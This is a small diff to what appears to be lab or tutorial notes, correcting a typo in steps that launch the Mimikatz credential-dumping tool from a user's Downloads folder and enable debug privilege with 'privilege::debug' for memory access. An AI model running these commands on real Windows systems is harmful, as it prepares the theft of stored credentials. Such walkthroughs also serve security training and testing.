@@ -30,9 +30,9 @@
 # Navigate to the x64 Folder
 cd c:\Users\pparker\Downloads\mimikatz_trunk\x64
 
-# Launch Mimikatz interactive shel
+# Launch Mimikatz interactive shell
 mimikatz.exe    
-                     l
+
 # Enables debug privilege (required for memory access)
 privilege::debug     
 # Expected output: Privilege '20' OK  
